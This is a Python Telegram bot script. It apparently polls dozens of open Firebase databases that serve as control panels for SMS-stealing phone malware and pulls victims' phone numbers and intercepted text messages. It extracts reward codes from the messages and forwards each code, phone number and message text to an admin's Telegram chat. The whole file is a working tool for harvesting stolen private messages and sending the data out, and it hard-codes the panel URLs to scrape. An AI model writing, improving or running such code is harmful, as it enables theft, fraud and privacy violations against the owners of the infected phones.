  "https://matrixpannel51-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://matrixpannel57-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://maxjoker98-148a1-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://mod-hack-a3a9a-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://mohan-pal-a53c6-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://mohiwuwhe-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://mparivahan-855fb-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://murga-cd712-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://mutthi-68-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://myadmin-6d68b-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://myyy-2cf22-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://nirmal-chacha-ka-new-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://nkpannel-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://offline-f65fe-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://omg-firbase-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://opalmutti-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://pawan-panel-7954b-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://payal-25f43-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://payloadmilgay-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://pk9508-37f99-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://pmnew197-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://pmnew281-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://poiyt-3f088-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://pramod-panel-cleint-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://prem-7fa0f-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://premium-videos-6b4b9-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://pushpa-raj-60ec2-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://rahual-757f9-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://rahuladmin-14f4e-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://rajap-28fd4-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://rajdkraj-e60e9-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://rajiv-c5a77-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://raju72-5a55c-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://rajuu-6d6a9-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://rakesh-c2bcf-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ram-admin-setupp-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ram-ka-4eba6-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://ram-yejdh-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://richieeeeeeeeeeeeeeeeeeepanl-default-rtdb.asia-southeast1.firebasedatabase.app": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://rkdm-2e65f-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://rocky-51531-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://rto-yadav-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://rtoadmin-49319-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://rtochallan-apk-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://ruhr-4da8f-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://salu-998df-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://samircc-4c78d-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://sarojkhanadmin-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://sddsd-3a2db-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://siku-8b898-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://solodarling-a3ed8-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://subhukk-d33a6-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://suman-fead4-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://tesla-e4848-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://ttttt-a6d8a-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://uttam-a838b-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://vevek-kumar-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://vijay-61a91-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://vinay-9395c-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://vishnu-cha-3-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://waleeebbb-fc031-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://yellow-new-panel-xxx-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://your-father-81327-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://yyyt-b3c34-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://zone-7296d-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
}

PANELS: List[dict] = []
for url, info in PANEL_FORMATS.items():
    if info.get("fmt") in ("dead", "unknown"):
        continue
    name = url.split("//", 1)[-1].split(".", 1)[0]
    PANELS.append({
        "name": name,
        "url": url.rstrip("/") + "/",
        "fmt": info["fmt"],
        "paths": info.get("paths") or {},
    })

log.info(f"Panels loaded in memory: {len(PANELS)}")

REWARD_RE = re.compile(
    r"(Success!\s*Your\s*Reward\s*Code\s*is|Your\s*Reward\s*Code\s*is|Reward\s*Code\s*is|"
    r"your\s*reward\s*is|reward\s*code)",
    re.I,
)
CODE_RE = re.compile(
    r"(?:Reward\s*Code\s*is|code\s*is|Code:|reward\s*is)\s*([A-Z0-9\-]{4,24})",
    re.I,
)
SIM1_KEYS = (
    "sim1Number", "sim1", "number1", "phone", "mobile", "number",
    "mobNo", "phoneNumber", "numberSim1",
)
SIM2_KEYS = ("sim2Number", "sim2", "number2", "numberSim2", "secondaryNumber")

# ══════════════ STATE ══════════════
SEEN: Set[str] = set()
SEEN_Q: deque = deque()
WATCH: List[dict] = []
# panel_url -> {cid: last_shallow_signature}
SHALLOW_SNAP: Dict[str, Dict[str, str]] = {}
# cid lookup phone cache: panel:cid -> {s1,s2}
PHONE_CACHE: Dict[str, dict] = {}
ALERT_N = 0
STATS = {
    "online_nums": 0,
    "offline_devs": 0,
    "total_nums": 0,
    "old_codes": 0,
    "online_devs": 0,
    "waves": 0,
    "alerts": 0,
    "deep_fetches": 0,
}
START_TS = int(time.time())
http: Optional[aiohttp.ClientSession] = None
MONITOR_TASK = None


def seen_add(uid: str) -> bool:
    if uid in SEEN:
        return False
    SEEN.add(uid)
    SEEN_Q.append(uid)
    while len(SEEN_Q) > MAX_SEEN:
        SEEN.discard(SEEN_Q.popleft())
    return True


def norm_phone(v) -> str:
    if not v:
        return ""
    d = re.sub(r"\D", "", str(v))
    if len(d) >= 12 and d.startswith("91"):
        d = d[-10:]
    elif len(d) >= 11 and d.startswith("0"):
        d = d[1:11]
    return d[-10:] if len(d) >= 10 else ""


def pick_phone(d: dict, keys) -> str:
    if not isinstance(d, dict):
        return ""
    for k in keys:
        if d.get(k):
            p = norm_phone(d.get(k))
            if len(p) == 10:
                return p
    return ""


def is_online_info(info: dict) -> bool:
    if not isinstance(info, dict):
        return False
    st = str(info.get("Status") or info.get("status") or "").lower()
    if st in ("online", "true", "1", "active", "connected", "on", "yes", "ok"):
        return True
    if info.get("status") is True or info.get("online") is True:
        return True
    for k in ("lastSeen", "lastOnline", "timestamp", "updatedAt"):
        if k in info:
            try:
                ts = float(info[k])
                if ts > 1e12:
                    ts /= 1000.0
                if ts > 1e9 and (time.time() - ts) < 1800:
                    return True
            except Exception:
                pass
    return False


def get_sms_ts(m: dict, mid: str = "") -> int:
    if isinstance(m, dict):
        for k in ("timestamp", "time", "date", "ts", "createdAt", "receivedAt", "msgTime", "id"):
            v = m.get(k)
            if v is None:
                continue
            try:
                ts = float(v)
                if ts > 1e12:
                    ts /= 1000.0
                if ts > 1e9:
                    return int(ts)
            except Exception:
                pass
        # dateTime string
        dt = m.get("dateTime") or m.get("datetime")
        if dt:
            try:
                s = str(dt).strip()
                m2 = re.match(
                    r"(\d{1,2})-(\d{1,2})-(\d{4})\s*\|\s*(\d{1,2}):(\d{2})\s*(am|pm)?",
                    s, re.I,
                )
                if m2:
                    from datetime import datetime as _dt
                    d, mo, y = int(m2.group(1)), int(m2.group(2)), int(m2.group(3))
                    hh, mm = int(m2.group(4)), int(m2.group(5))
                    ap = (m2.group(6) or "").lower()
                    if ap == "pm" and hh < 12:
                        hh += 12
                    if ap == "am" and hh == 12:
                        hh = 0
                    return int(_dt(y, mo, d, hh, mm).timestamp())
            except Exception:
                pass
    if mid:
        try:
            ts = float(mid)
            if ts > 1e12:
                ts /= 1000.0
            if ts > 1e9:
                return int(ts)
        except Exception:
            pass
    return 0


async def jget(session, url, timeout=HTTP_TIMEOUT):
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            if r.status != 200:
                return None
            return await r.json(content_type=None)
    except Exception:
        return None


async def load_panel_online(session, panel: dict) -> tuple:
    name, base = panel["name"], panel["url"]
    fmt = panel.get("fmt", "unknown")
    paths = panel.get("paths") or {}
    out: List[dict] = []
    offline = 0
    total_nums = 0

    if fmt in ("panel-wala", "panel-wala-lite", "spy"):
        di_path = paths.get("deviceInfo") or (
            "All_Users/Data/DeviceInfo" if fmt == "spy" else "All_Users/DeviceInfo"
        )
        sim_path = paths.get("simDetails") or "All_Users/simDetails"
        sms_path = paths.get("sms") or "All_Users/sms"

        info = await jget(session, base + di_path + ".json")
        if not isinstance(info, dict) or not info:
            return out, 0, 0

        online_ids = []
        for did, dev in info.items():
            if not isinstance(dev, dict) or str(did).startswith("__"):
                continue
            if is_online_info(dev):
                online_ids.append(str(did))
            else:
                offline += 1
        online_ids = online_ids[:MAX_ONLINE_PER_PANEL]
        del info
        if not online_ids:
            return out, offline, 0

        sims = await jget(session, base + sim_path + ".json") or {}
        if not isinstance(sims, dict):
            sims = {}

        for did in online_ids:
            sd = sims.get(did) if isinstance(sims.get(did), dict) else {}
            s1 = pick_phone(sd, SIM1_KEYS)
            s2 = pick_phone(sd, SIM2_KEYS)
            total_nums += (1 if s1 else 0) + (1 if s2 else 0)
            d = {
                "panel": name, "base": base, "id": did,
                "s1": s1, "s2": s2,
                "sms_path": "panel", "sms_root": sms_path,
                "fmt": fmt,
            }
            out.append(d)
            PHONE_CACHE[f"{name}:{did}"] = d
        del sims
        return out, offline, total_nums

    # rto-sala
    shallow = await jget(session, base + "clients.json?shallow=true")
    ids = []
    if isinstance(shallow, dict):
        ids = [str(k) for k in shallow if not str(k).startswith("__")][:100]
    del shallow
    if not ids:
        shallow = await jget(session, base + "devices.json?shallow=true")
        if isinstance(shallow, dict):
            ids = [str(k) for k in shallow if not str(k).startswith("__")][:100]
        del shallow

    clients = await jget(session, base + "clients.json") or {}
    if not isinstance(clients, dict):
        clients = {}

    sms_kind = "user_sms" if paths.get("user_sms") else "messages"
    for did in ids:
        c = clients.get(did)
        if not isinstance(c, dict):
            offline += 1
            continue
        on = c.get("status") is True or str(c.get("status")).lower() in (
            "true", "online", "1", "active"
        )
        s1 = pick_phone(c, SIM1_KEYS)
        s2 = pick_phone(c, SIM2_KEYS)
        if not s1:
            for key in ("command", "commands", "sendSms"):
                n = c.get(key)
                if isinstance(n, dict) and n.get("to"):
                    p = norm_phone(n.get("to"))
                    if len(p) == 10:
                        s1 = p
                        break
        total_nums += (1 if s1 else 0) + (1 if s2 else 0)
        if not on:
            offline += 1
            continue
        d = {
            "panel": name, "base": base, "id": did,
            "s1": s1, "s2": s2,
            "sms_path": sms_kind,
            "sms_root": paths.get("user_sms") or "messages",
            "fmt": "rto-sala",
        }
        out.append(d)
        PHONE_CACHE[f"{name}:{did}"] = d
        if len(out) >= MAX_ONLINE_PER_PANEL:
            break
    del clients
    return out, offline, total_nums


async def fetch_sms_deep(session, base: str, did: str, kind: str, root: str) -> dict:
    """Fetch last SMS_LAST messages for one device."""
    if kind == "panel":
        r = root or "All_Users/sms"
        paths = [
            f"{base}{r}/{did}.json?orderBy=%22%24key%22&limitToLast={SMS_LAST}",
            f"{base}{r}/{did}.json",
            f"{base}All_Users/sms/{did}.json?orderBy=%22%24key%22&limitToLast={SMS_LAST}",
        ]
    elif kind == "user_sms":
        paths = [
            f"{base}user_sms/{did}.json?orderBy=%22%24key%22&limitToLast={SMS_LAST}",
            f"{base}user_sms/{did}.json",
        ]
    else:
        paths = [
            f"{base}messages/{did}.json?orderBy=%22%24key%22&limitToLast={SMS_LAST}",
            f"{base}messages/{did}.json",
        ]

    for path in paths:
        data = await jget(session, path, HTTP_TIMEOUT)
        if not isinstance(data, dict) or not data:
            continue
        if did in data and isinstance(data[did], dict):
            node = data[did]
            keys = sorted(node.keys())[-SMS_LAST:]
            return {k: node[k] for k in keys}
        keys = sorted(data.keys())[-SMS_LAST:]
        return {k: data[k] for k in keys}
    return {}


def body_of(m: dict) -> str:
    if not isinstance(m, dict):
        return ""
    for k in ("message", "body", "text", "msg", "sms", "content", "messageText"):
        v = m.get(k)
        if isinstance(v, str) and v.strip():
            return v.strip()
    return ""


def code_of(body: str) -> str:
    m = CODE_RE.search(body)
    if m:
        return m.group(1).upper()
    m2 = re.search(r"\b([A-Z0-9]{8,16})\b", body)
    return m2.group(1) if m2 else ""


async def alert(bot, panel, phone, body, code, sim=""):
    global ALERT_N
    ALERT_N += 1
    STATS["alerts"] = ALERT_N
    um = re.search(r"https?://[^\s]+", body or "")
    url = um.group(0).rstrip(").,]") if um else "—"
    text = (
        f"#{ALERT_N}\n"
        f"reward code = <code>{code or '—'}</code>\n"
        f"phone = <code>{phone or '—'}</code>\n"
        f"panel = {panel}\n"
        f"url = {url}\n"
        f"msg = {body[:900]}"
    )
    try:
        await bot.send_message(ADMIN_ID, text, parse_mode="HTML")
        log.info(f"ALERT #{ALERT_N} | {code} | {phone} | {url}")
    except Exception as e:
        log.error(f"tg {e}")


async def process_sms_bucket(bot, panel_name: str, did: str, data: dict, mark_only: bool = False) -> int:
    """Parse SMS dict, alert on new rewards. Returns old marked count."""
    if not data:
        return 0
    cached = PHONE_CACHE.get(f"{panel_name}:{did}") or {}
    phone = cached.get("s1") or cached.get("s2") or ""
    sim = "sim1" if cached.get("s1") else ("sim2" if cached.get("s2") else "")
    old = 0
    for mid, m in data.items():
        if not isinstance(m, dict):
            continue
        body = body_of(m)
        if not body or not REWARD_RE.search(body):
            continue
        sms_ts = get_sms_ts(m, str(mid))
        uid = f"{panel_name}:{did}:{mid}"
        if sms_ts and sms_ts < START_TS:
            if seen_add(uid):
                old += 1
            continue
        if mark_only:
            if seen_add(uid):
                old += 1
            continue
        if not seen_add(uid):
            continue
        await alert(bot, panel_name, phone, body, code_of(body), sim)
    return old


async def panel_shallow_messages(session, panel: dict) -> Dict[str, str]:
    """
    Returns {cid: signature} for messages node.
    signature = number of keys as string OR joined last keys if small.
    For rto: messages.json?shallow=true → {cid: true}
    We store '1' as present; change detection needs deep poll when we don't have prior.
    Better: store sorted key count from shallow if firebase returns true only.
    Firebase shallow on messages returns {cid: true} so we can't see internal change.
    So we MUST deep-fetch online devices, but only those in WATCH for this panel.
    """
    base = panel["url"]
    fmt = panel.get("fmt", "")
    paths = panel.get("paths") or {}
    if fmt in ("panel-wala", "panel-wala-lite", "spy"):
        sms = paths.get("sms") or "All_Users/sms"
        data = await jget(session, base + sms + ".json?shallow=true", SHALLOW_TIMEOUT)
    else:
        data = await jget(session, base + "messages.json?shallow=true", SHALLOW_TIMEOUT)
    if not isinstance(data, dict):
        return {}
    # shallow gives {cid: true} — signature is presence only
    # For change detection of NEW messages inside cid we still need deep fetch.
    # Optimization: only deep-fetch WATCH devices for this panel each wave (parallel).
    return {str(k): "1" for k in data if not str(k).startswith("__")}


async def rebuild_watch(session) -> str:
    global WATCH
    sem = asyncio.Semaphore(PANEL_CONC)
    all_devs: List[dict] = []
    offline_total = 0
    nums_total = 0

    async def one(p):
        async with sem:
            try:
                return await load_panel_online(session, p)
            except Exception as e:
                log.error(f"load {p['name']}: {e}")
                return [], 0, 0

    for i in range(0, len(PANELS), CHUNK):
        chunk = PANELS[i:i + CHUNK]
        results = await asyncio.gather(*(one(p) for p in chunk))
        for lst, off, nums in results:
            all_devs.extend(lst)
            offline_total += off
            nums_total += nums
        del results
        gc.collect()
        log.info(f"load {min(i+CHUNK, len(PANELS))}/{len(PANELS)} watch={len(all_devs)}")

    WATCH = all_devs
    online_nums = sum((1 if d.get("s1") else 0) + (1 if d.get("s2") else 0) for d in WATCH)
    STATS["online_nums"] = online_nums
    STATS["offline_devs"] = offline_total
    STATS["total_nums"] = nums_total
    STATS["online_devs"] = len(WATCH)
    return (
        f"✅ <b>Ready</b> (only NEW after start)\n"
        f"Online = <b>{online_nums}</b>\n"
        f"Offline = <b>{offline_total}</b>\n"
        f"Total numbers = <b>{nums_total}</b>\n"
        f"Watch devices = <b>{len(WATCH)}</b>\n"
        f"Panels = <b>{len(PANELS)}</b>"
    )


async def baseline_mark(session) -> int:
    sem = asyncio.Semaphore(DEVICE_CONC)
    total_old = 0

    async def one(dev):
        async with sem:
            try:
                data = await fetch_sms_deep(
                    session, dev["base"], dev["id"],
                    dev.get("sms_path") or "messages",
                    dev.get("sms_root") or "",
                )
                return await process_sms_bucket(None, dev["panel"], dev["id"], data, mark_only=True)
            except Exception:
                return 0

    for i in range(0, len(WATCH), 150):
        chunk = WATCH[i:i + 150]
        parts = await asyncio.gather(*(one(d) for d in chunk))
        total_old += sum(parts)
    STATS["old_codes"] = total_old
    return total_old


# rotating index for continuous partial scans
_RR_IDX = 0
BATCH_PER_TICK = 250  # devices polled each 0.1s tick

async def monitor_wave(session, bot) -> Tuple[int, float]:
    """
    Continuous rotating batch scan:
      every tick poll BATCH_PER_TICK devices in parallel.
      With watch=2500 & batch=250 → full cover ~1s, alerts nearly instant.
    """
    global _RR_IDX
    t0 = time.time()
    if not WATCH:
        return 0, 0.0
    n = len(WATCH)
    batch = []
    for _ in range(min(BATCH_PER_TICK, n)):
        batch.append(WATCH[_RR_IDX % n])
        _RR_IDX = (_RR_IDX + 1) % n

    sem = asyncio.Semaphore(DEVICE_CONC)
    deep = 0

    async def work(dev):
        nonlocal deep
        async with sem:
            try:
                data = await fetch_sms_deep(
                    session, dev["base"], dev["id"],
                    dev.get("sms_path") or "messages",
                    dev.get("sms_root") or "",
                )
                deep += 1
                if data:
                    await process_sms_bucket(bot, dev["panel"], dev["id"], data, mark_only=False)
            except Exception:
                pass

    await asyncio.gather(*(work(d) for d in batch))
    elapsed = time.time() - t0
    STATS["waves"] += 1
    STATS["deep_fetches"] += deep
    return deep, elapsed


async def monitor_loop(app: Application):
    global http, START_TS
    bot = app.bot
    conn = aiohttp.TCPConnector(
        limit=250,
        limit_per_host=20,
        ttl_dns_cache=300,
        force_close=False,
        enable_cleanup_closed=True,
    )
    http = aiohttp.ClientSession(
        connector=conn,
        headers={"User-Agent": "Mozilla/5.0"},
        timeout=aiohttp.ClientTimeout(total=HTTP_TIMEOUT + 0.5),
    )

    START_TS = int(time.time())
    log.info(f"Initial load START_TS={START_TS}")
    summary = await rebuild_watch(http)
    old = await baseline_mark(http)
    summary += f"\nOld codes ignored = <b>{old}</b>"
    log.info(f"Watch={len(WATCH)} old_marked={old}")
    try:
        await bot.send_message(ADMIN_ID, summary, parse_mode="HTML")
    except Exception:
        pass

    last_reload = time.time()
    last_stat = time.time()
    while True:
        try:
            if time.time() - last_reload > RELOAD_EVERY:
                # background-ish reload without stopping long
                log.info("Reloading watch list...")
                await rebuild_watch(http)
                last_reload = time.time()
                gc.collect()

            deep, elapsed = await monitor_wave(http, bot)
            if time.time() - last_stat > 15:
                log.info(
                    f"wave#{STATS['waves']} deep={deep} "
                    f"time={elapsed:.2f}s alerts={ALERT_N} watch={len(WATCH)}"
                )
                last_stat = time.time()

            # target ~0.1s idle between waves; if wave itself is long, sleep minimal
            await asyncio.sleep(max(0.02, POLL_INTERVAL - elapsed) if elapsed < POLL_INTERVAL else 0.02)
        except asyncio.CancelledError:
            break
        except Exception as e:
            log.error(f"loop {e}")
            gc.collect()
            await asyncio.sleep(1)


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global START_TS, ALERT_N
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id if update.effective_user else 0
    if chat_id != ADMIN_ID and user_id != ADMIN_ID and chat_id != abs(ADMIN_ID):
        # allow the configured group/user only
        if chat_id != ADMIN_ID:
            return

    START_TS = int(time.time())
    ALERT_N = 0
    SEEN.clear()
    SEEN_Q.clear()

    msg = await update.message.reply_text("⏳ Resetting baseline (only NEW codes after now)...")
    if http is None or http.closed:
        await msg.edit_text("❌ HTTP session not ready, wait a few seconds.")
        return

    try:
        summary = await rebuild_watch(http)
        old = await baseline_mark(http)
        text = (
            f"✅ <b>Live — only NEW codes</b>\n"
            f"Online = <b>{STATS['online_nums']}</b>\n"
            f"Offline = <b>{STATS['offline_devs']}</b>\n"
            f"Total numbers = <b>{STATS['total_nums']}</b>\n"
            f"Old codes ignored = <b>{old}</b>\n"
            f"Watch devices = <b>{len(WATCH)}</b>\n"
            f"START_TS = <code>{START_TS}</code>\n"
            f"Concurrency = panel {PANEL_CONC} / device {DEVICE_CONC}"
        )
        await msg.edit_text(text, parse_mode="HTML")
    except Exception as e:
        await msg.edit_text(f"❌ {e}")


async def cmd_reload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id != ADMIN_ID:
        return
    msg = await update.message.reply_text("⏳ Reloading panels...")
    try:
        text = await rebuild_watch(http)
        await msg.edit_text(text, parse_mode="HTML")
    except Exception as e:
        await msg.edit_text(f"❌ {e}")
    gc.collect()


async def post_init(app: Application):
    global MONITOR_TASK
    MONITOR_TASK = asyncio.create_task(monitor_loop(app))


async def post_shutdown(app: Application):
    global http, MONITOR_TASK
    if MONITOR_TASK:
        MONITOR_TASK.cancel()
        try:
            await MONITOR_TASK
        except Exception:
            pass
    if http and not http.closed:
        await http.close()


def main():
    log.info(
        f"INSTANT | panels={len(PANELS)} | poll={POLL_INTERVAL}s | "
        f"dev_conc={DEVICE_CONC} | panel_conc={PANEL_CONC} | chat={ADMIN_ID}"
    )
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .post_shutdown(post_shutdown)
        .build()
    )
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("reload", cmd_reload))
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
